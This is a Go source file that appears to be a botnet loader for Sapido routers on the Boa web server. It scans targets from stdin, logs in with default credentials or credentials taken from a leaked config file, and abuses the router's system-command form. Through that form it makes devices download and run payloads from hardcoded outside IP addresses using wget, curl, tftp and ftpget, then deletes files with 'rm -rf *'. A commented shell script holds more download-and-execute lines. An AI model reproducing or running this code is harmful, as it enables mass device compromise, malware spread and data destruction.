package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"bufio"
	"io"
	"bytes"
	"strconv"
)

var (
	port = os.Args[1]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	loggedIn uint64
	sysCmdTtl uint64
	executed uint64

    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
	payload = "put ur payload"

	executeMessage = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.205/1.sh; curl -O http://196.251.72.205/1.sh; chmod 777 1.sh; sh 1.sh; tftp 196.251.72.205 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 196.251.72.205; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 196.251.72.205 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *"

	//creds = []string{"super:super", "super:fib0028881", "super:admin", "admin:admin", "user:user", "default:default"}
	creds = []string{"super:super"}
)

// sh file
/*
#!/bin/sh
/bin/wget 45.79.116.202 1111 /BF23ewedqw/IKOWERA /var/tmp/a
chmod 777 /var/tmp/a; /var/tmp/a sep
/bin/wget 45.79.116.202 1111 /BF23ewedqw/AQUIJE3q2 /var/tmp/a
chmod 777 /var/tmp/a; /var/tmp/a sep
*/

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Boa")
}

func runCommand(target, command string) bool{
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "sysCmd=" + command + "&apply=Apply&submit-url=%2Fsyscmd.htm&msg="
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.1\r\nReferer: http://" + target + "/syscmd.htm\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Redirect")
}

func checksysCmd(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /syscmd.htm HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), executeMessage) {
		fmt.Printf("[SAPIDO] infected successfully %s\n", target)
		executed++
	}

	return strings.Contains(buff.String(), "/boafrm/formSysCmd")
}

func getCredLeak(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /obama.dat HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	var username, password string

	if strings.Contains(buff.String(), "SUPER_NAME=\"") {
		usernameStr := strings.Split(buff.String(), "SUPER_NAME=\"")

		if len(usernameStr) > 1 {
			username = strings.Split(usernameStr[1], "\"")[0]
		}
	}

	if strings.Contains(buff.String(), "SUPER_PASSWORD=\"") {
		passwordStr := strings.Split(buff.String(), "SUPER_PASSWORD=\"")

		if len(passwordStr) > 1 {
			password = strings.Split(passwordStr[1], "\"")[0]
		}
	}

	return username, password
}

func loginDevice(target, username, password string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "lang=0&username=" + username + "&password=" + password + "&login=Login&submitChange=0&newpassword1=New+Password&newpassword2=Reenter+New+Password"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /boafrm/formLogin HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nReferer: http://" + target + "/login.htm\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "/home.htm")
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	for _, cred := range creds {
		username := strings.Split(cred, ":")[0]
		password := strings.Split(cred, ":")[1]

		if !loginDevice(target, username, password) {
			continue
		}

		fmt.Printf("[SAPIDO] logged in to %s with %s\n", target, cred)
		loggedIn++

		if !checksysCmd(target) {
			return
		}

		fmt.Printf("[SAPIDO] found syscmd %s\n", target)
		sysCmdTtl++

		if !runCommand(target, "%2Fbin%2Fwget+80.85.86.157+1111+sep+%2Fvar%2Ftmp%2Fa") {
			return
		}

		if !checksysCmd(target) {
			return
		}

		time.Sleep(5 * time.Second)

		if !runCommand(target, "chmod+777+%2Fvar%2Ftmp%2Fa%3B+%2Fvar%2Ftmp%2Fa+sep") {
			return
		}

		checksysCmd(target)
		return
	}
}

func stopLoader() {
	time.Sleep(20 * time.Second)
	for {
		if runtime.NumGoroutine() < 1000 {
			os.Exit(1)
		}
		time.Sleep(1 * time.Second)
	}
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Logged In: %d | SysCmd: %d | Exploited: %d\n", processed, found, loggedIn, sysCmdTtl, executed)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()
	go stopLoader()

	for scanner.Scan() {


		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}

